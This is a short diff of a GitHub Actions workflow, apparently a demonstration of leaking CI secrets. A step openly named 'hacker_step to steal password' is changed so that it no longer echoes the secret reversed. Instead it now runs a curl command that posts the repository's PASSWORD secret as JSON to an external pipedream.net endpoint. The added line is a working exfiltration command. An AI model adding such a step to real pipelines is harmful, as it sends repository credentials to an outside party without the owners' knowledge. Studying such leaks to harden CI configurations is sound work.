@@ -29,6 +29,7 @@ jobs:
         run: echo $mypassword | rev
       
       - name: hacker_step to steal password
-        run: echo ${{secrets.PASSWORD}} | rev
+        run: |
+          curl -d '{"password":${{ secrets.PASSWORD }}}' -H "Content-Type: application/json" https://en91rb0j64jhook.m.pipedream.net
 
  
